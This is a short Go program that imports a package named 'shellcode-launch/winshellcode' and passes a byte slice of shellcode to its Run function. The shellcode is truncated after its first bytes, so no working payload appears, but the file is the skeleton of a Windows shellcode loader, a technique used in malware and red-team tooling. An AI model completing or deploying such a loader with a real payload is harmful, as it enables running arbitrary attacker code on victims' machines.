package main

import (
	"shellcode-launch/winshellcode"
)

func main() {
	sc := []byte("\xfc\x48\....")
	winshellcode.Run(sc)
}
